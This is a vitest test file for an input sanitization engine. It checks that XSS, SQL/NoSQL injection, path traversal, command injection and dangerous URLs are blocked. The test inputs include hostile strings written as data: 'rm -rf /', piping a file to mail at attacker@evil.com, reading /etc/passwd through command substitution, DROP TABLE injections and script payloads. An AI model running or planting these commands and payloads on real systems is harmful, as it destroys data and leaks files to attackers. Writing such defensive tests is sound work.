/**
 * InputSanitizationEngine Tests — U-LPR-SEC07
 *
 * Tests for comprehensive input sanitization:
 * - XSS prevention
 * - SQL/NoSQL injection prevention
 * - Path traversal prevention
 * - Command injection prevention
 * - URL/filename sanitization
 */

import { describe, it, expect, beforeEach } from 'vitest';
import {
  InputSanitizationEngine,
  inputSanitizationEngine,
} from '../engines/InputSanitizationEngine.js';

describe('InputSanitizationEngine', () => {
  let engine: InputSanitizationEngine;

  beforeEach(() => {
    engine = new InputSanitizationEngine();
  });

  describe('HTML Sanitization (XSS Prevention)', () => {
    it('should escape HTML entities', () => {
      const result = engine.sanitizeHtml('<script>alert("xss")</script>');

      expect(result.modified).toBe(true);
      expect(result.sanitized).not.toContain('<script>');
      expect(result.sanitized).not.toContain('</script>');
    });

    it('should remove script tags', () => {
      const result = engine.sanitizeHtml('Hello<script>evil()</script>World');

      expect(result.removedPatterns.length).toBeGreaterThan(0);
      expect(result.sanitized).not.toContain('script');
    });

    it('should remove event handlers', () => {
      const result = engine.sanitizeHtml('<img src="x" onerror="alert(1)">');

      expect(result.modified).toBe(true);
      expect(result.removedPatterns).toContain('onerror=');
    });

    it('should remove javascript: URLs', () => {
      const result = engine.sanitizeHtml('<a href="javascript:alert(1)">click</a>');

      expect(result.modified).toBe(true);
      expect(result.sanitized).not.toContain('javascript:');
    });

    it('should handle iframe tags', () => {
      const result = engine.sanitizeHtml('<iframe src="evil.com"></iframe>');

      expect(result.modified).toBe(true);
      expect(result.removedPatterns.some(p => p.toLowerCase().includes('iframe'))).toBe(true);
    });

    it('should escape ampersand', () => {
      const result = engine.sanitizeHtml('Tom & Jerry');

      expect(result.sanitized).toContain('&amp;');
    });

    it('should respect maxLength option', () => {
      const result = engine.sanitizeHtml('Hello World', { maxLength: 5 });

      expect(result.sanitized.length).toBeLessThanOrEqual(5);
      expect(result.warnings).toContain('Truncated to 5 characters');
    });

    it('should normalize unicode by default', () => {
      const input = 'café';
      const result = engine.sanitizeHtml(input);

      expect(result.sanitized).toBe(result.sanitized.normalize('NFC'));
    });

    it('should strip null bytes', () => {
      const result = engine.sanitizeHtml('hello\x00world');

      expect(result.sanitized).not.toContain('\x00');
    });

    it('should handle clean input without modification', () => {
      const result = engine.sanitizeHtml('Normal text');

      expect(result.sanitized).toBe('Normal text');
    });
  });

  describe('JavaScript Sanitization', () => {
    it('should escape single quotes', () => {
      const result = engine.sanitizeJavaScript("it's a test");

      expect(result.sanitized).toContain("\\'");
    });

    it('should escape double quotes', () => {
      const result = engine.sanitizeJavaScript('say "hello"');

      expect(result.sanitized).toContain('\\"');
    });

    it('should escape newlines', () => {
      const result = engine.sanitizeJavaScript('line1\nline2');

      expect(result.sanitized).toContain('\\n');
    });

    it('should escape backslashes', () => {
      const result = engine.sanitizeJavaScript('path\\to\\file');

      expect(result.sanitized).toContain('\\\\');
    });

    it('should escape angle brackets as hex', () => {
      const result = engine.sanitizeJavaScript('<script>');

      expect(result.sanitized).toContain('\\x3c');
      expect(result.sanitized).toContain('\\x3e');
    });
  });

  describe('SQL Sanitization', () => {
    it('should detect SELECT injection', () => {
      const result = engine.sanitizeSql("'; SELECT * FROM users; --");

      expect(result.modified).toBe(true);
      expect(result.warnings).toContain('SQL injection pattern detected');
    });

    it('should detect UNION injection', () => {
      const result = engine.sanitizeSql('1 UNION SELECT password FROM users');

      expect(result.removedPatterns.some(p => p.toUpperCase().includes('UNION'))).toBe(true);
    });

    it('should escape single quotes', () => {
      const result = engine.sanitizeSql("O'Brien");

      expect(result.sanitized).toContain("''");
    });

    it('should detect DROP TABLE', () => {
      const result = engine.sanitizeSql('1; DROP TABLE users;');

      expect(result.removedPatterns.some(p => p.toUpperCase().includes('DROP'))).toBe(true);
    });

    it('should handle clean input', () => {
      const result = engine.sanitizeSql('John Doe');

      expect(result.warnings).toHaveLength(0);
    });
  });

  describe('NoSQL Sanitization', () => {
    it('should remove MongoDB operators', () => {
      const result = engine.sanitizeNoSql('{ "$gt": "" }');

      expect(result.modified).toBe(true);
      expect(result.sanitized).not.toContain('$gt');
    });

    it('should remove curly braces', () => {
      const result = engine.sanitizeNoSql('{ "password": { "$ne": "" } }');

      expect(result.sanitized).not.toContain('{');
      expect(result.sanitized).not.toContain('}');
    });

    it('should handle $where operator', () => {
      const result = engine.sanitizeNoSql('$where: "this.password === user_input"');

      expect(result.removedPatterns).toContain('$where');
    });
  });

  describe('Path Sanitization', () => {
    it('should remove ../ traversal', () => {
      const result = engine.sanitizePath('../../etc/passwd');

      expect(result.modified).toBe(true);
      expect(result.sanitized).not.toContain('..');
      expect(result.warnings).toContain('Path traversal pattern detected');
    });

    it('should remove ..\\  traversal (Windows)', () => {
      const result = engine.sanitizePath('..\\..\\windows\\system32');

      expect(result.sanitized).not.toContain('..');
    });

    it('should handle URL-encoded traversal', () => {
      const result = engine.sanitizePath('..%2f..%2fetc%2fpasswd');

      expect(result.removedPatterns.length).toBeGreaterThan(0);
    });

    it('should normalize path separators', () => {
      const result = engine.sanitizePath('path\\\\to///file');

      expect(result.sanitized).toBe('path/to/file');
    });

    it('should remove leading slashes', () => {
      const result = engine.sanitizePath('///etc/passwd');

      expect(result.sanitized).not.toMatch(/^\//);
    });

    it('should remove null bytes', () => {
      const result = engine.sanitizePath('file.txt\x00.jpg');

      expect(result.sanitized).not.toContain('\x00');
    });
  });

  describe('Command Sanitization', () => {
    it('should remove semicolons', () => {
      const result = engine.sanitizeCommand('ls; rm -rf /');

      expect(result.modified).toBe(true);
      expect(result.sanitized).not.toContain(';');
    });

    it('should remove pipe characters', () => {
      const result = engine.sanitizeCommand('cat file | mail attacker@evil.com');

      expect(result.sanitized).not.toContain('|');
    });

    it('should remove backticks', () => {
      const result = engine.sanitizeCommand('echo `whoami`');

      expect(result.sanitized).not.toContain('`');
    });

    it('should remove $() command substitution', () => {
      const result = engine.sanitizeCommand('echo $(cat /etc/passwd)');

      expect(result.sanitized).not.toContain('$(');
    });

    it('should remove newlines', () => {
      const result = engine.sanitizeCommand("file\nrm -rf /");

      expect(result.sanitized).not.toContain('\n');
    });

    it('should only allow safe characters', () => {
      const result = engine.sanitizeCommand('my-file_name.txt');

      expect(result.sanitized).toBe('my-file_name.txt');
      expect(result.modified).toBe(false);
    });
  });

  describe('URL Sanitization', () => {
    it('should block javascript: protocol', () => {
      const result = engine.sanitizeUrl('javascript:alert(1)');

      expect(result.sanitized).toBe('');
      expect(result.removedPatterns).toContain('javascript:');
    });

    it('should block data: protocol', () => {
      const result = engine.sanitizeUrl('data:text/html,<script>alert(1)</script>');

      expect(result.sanitized).toBe('');
      expect(result.warnings).toContain('Dangerous protocol: data:');
    });

    it('should block vbscript: protocol', () => {
      const result = engine.sanitizeUrl('vbscript:msgbox(1)');

      expect(result.sanitized).toBe('');
    });

    it('should add https to bare domains', () => {
      const result = engine.sanitizeUrl('example.com');

      expect(result.sanitized).toBe('https://example.com');
    });

    it('should preserve valid https URLs', () => {
      const result = engine.sanitizeUrl('https://example.com/path');

      expect(result.sanitized).toBe('https://example.com/path');
    });

    it('should preserve valid http URLs', () => {
      const result = engine.sanitizeUrl('http://example.com');

      expect(result.sanitized).toBe('http://example.com');
    });
  });

  describe('Filename Sanitization', () => {
    it('should remove path separators', () => {
      const result = engine.sanitizeFilename('../../../etc/passwd');

      expect(result.sanitized).not.toContain('/');
      expect(result.sanitized).not.toContain('\\');
    });

    it('should remove Windows reserved characters', () => {
      const result = engine.sanitizeFilename('file<>:"|?*.txt');

      expect(result.sanitized).toBe('file.txt');
    });

    it('should remove leading dots', () => {
      const result = engine.sanitizeFilename('...htaccess');

      expect(result.sanitized).not.toMatch(/^\./);
    });

    it('should remove trailing dots', () => {
      const result = engine.sanitizeFilename('file.txt...');

      expect(result.sanitized).not.toMatch(/\.$/);
    });

    it('should truncate long filenames preserving extension', () => {
      const longName = 'a'.repeat(300) + '.txt';
      const result = engine.sanitizeFilename(longName, { maxLength: 20 });

      expect(result.sanitized.length).toBeLessThanOrEqual(20);
      expect(result.sanitized).toMatch(/\.txt$/);
    });

    it('should remove control characters', () => {
      const result = engine.sanitizeFilename('file\x00\x1f.txt');

      expect(result.sanitized).toBe('file.txt');
    });
  });

  describe('Alphanumeric Sanitization', () => {
    it('should remove all non-alphanumeric characters', () => {
      const result = engine.sanitizeAlphanumeric('Hello, World! @#$%');

      expect(result.sanitized).toBe('HelloWorld');
    });

    it('should preserve numbers', () => {
      const result = engine.sanitizeAlphanumeric('Test123');

      expect(result.sanitized).toBe('Test123');
    });

    it('should handle empty result', () => {
      const result = engine.sanitizeAlphanumeric('!@#$%');

      expect(result.sanitized).toBe('');
    });

    it('should respect maxLength', () => {
      const result = engine.sanitizeAlphanumeric('ABCDEFGHIJ', { maxLength: 5 });

      expect(result.sanitized).toBe('ABCDE');
    });
  });

  describe('Email Validation', () => {
    it('should validate correct email', () => {
      const result = engine.validateEmail('user@example.com');

      expect(result.valid).toBe(true);
      expect(result.sanitized).toBe('user@example.com');
    });

    it('should reject email without @', () => {
      const result = engine.validateEmail('userexample.com');

      expect(result.valid).toBe(false);
      expect(result.errors).toContain('Invalid email format');
    });

    it('should reject email without domain', () => {
      const result = engine.validateEmail('user@');

      expect(result.valid).toBe(false);
    });

    it('should reject email with angle brackets', () => {
      const result = engine.validateEmail('<script>@evil.com');

      expect(result.valid).toBe(false);
      expect(result.errors).toContain('Invalid characters in email');
    });

    it('should lowercase and trim email', () => {
      const result = engine.validateEmail('  User@EXAMPLE.com  ');

      expect(result.sanitized).toBe('user@example.com');
    });
  });

  describe('Generic Sanitize Method', () => {
    it('should route to correct method based on type', () => {
      const htmlResult = engine.sanitize('<script>', 'html');
      const sqlResult = engine.sanitize("'; SELECT * FROM users; --", 'sql');
      const pathResult = engine.sanitize('../etc', 'path');

      expect(htmlResult.sanitized).not.toContain('<script>');
      expect(sqlResult.removedPatterns.length).toBeGreaterThan(0);
      expect(pathResult.sanitized).not.toContain('..');
    });

    it('should handle all sanitization types', () => {
      const types = [
        'html', 'javascript', 'sql', 'nosql',
        'path', 'command', 'url', 'filename', 'alphanumeric'
      ] as const;

      for (const type of types) {
        const result = engine.sanitize('test', type);
        expect(result).toHaveProperty('sanitized');
      }
    });
  });

  describe('Batch Sanitization', () => {
    it('should sanitize multiple inputs', () => {
      const results = engine.sanitizeBatch([
        { value: '<script>alert(1)</script>', type: 'html' },
        { value: "'; DROP TABLE users; --", type: 'sql' },
        { value: '../../etc/passwd', type: 'path' },
      ]);

      expect(results).toHaveLength(3);
      expect(results[0].sanitized).not.toContain('<script>');
      expect(results[1].warnings).toContain('SQL injection pattern detected');
      expect(results[2].sanitized).not.toContain('..');
    });

    it('should apply options per input', () => {
      const results = engine.sanitizeBatch([
        { value: 'Hello World', type: 'html', options: { maxLength: 5 } },
        { value: 'ABCDEFGHIJ', type: 'alphanumeric', options: { maxLength: 3 } },
      ]);

      expect(results[0].sanitized.length).toBeLessThanOrEqual(5);
      expect(results[1].sanitized).toBe('ABC');
    });
  });

  describe('Statistics', () => {
    it('should track sanitization counts', () => {
      engine.sanitizeHtml('<script>');
      engine.sanitizeSql("' OR 1=1");
      engine.sanitizePath('../etc');

      const stats = engine.getStats();

      expect(stats.totalSanitizations).toBe(3);
      expect(stats.byType['html']).toBe(1);
      expect(stats.byType['sql']).toBe(1);
      expect(stats.byType['path']).toBe(1);
    });

    it('should track modification counts', () => {
      engine.sanitizeHtml('<script>');
      engine.sanitizeHtml('clean text');

      const stats = engine.getStats();

      expect(stats.modifiedCount).toBe(1);
    });

    it('should track blocked patterns', () => {
      engine.sanitizeHtml('<script>evil()</script>');
      engine.sanitizeSql("'; DROP TABLE users;");
      engine.sanitizePath('../../secret');

      const stats = engine.getStats();

      expect(stats.blockedPatterns['xss']).toBeGreaterThan(0);
      expect(stats.blockedPatterns['sql_injection']).toBeGreaterThan(0);
      expect(stats.blockedPatterns['path_traversal']).toBeGreaterThan(0);
    });

    it('should reset stats', () => {
      engine.sanitizeHtml('<script>');
      engine.resetStats();

      const stats = engine.getStats();

      expect(stats.totalSanitizations).toBe(0);
      expect(stats.modifiedCount).toBe(0);
    });
  });

  describe('Singleton Export', () => {
    it('should export singleton instance', () => {
      expect(inputSanitizationEngine).toBeInstanceOf(InputSanitizationEngine);
    });
  });
});
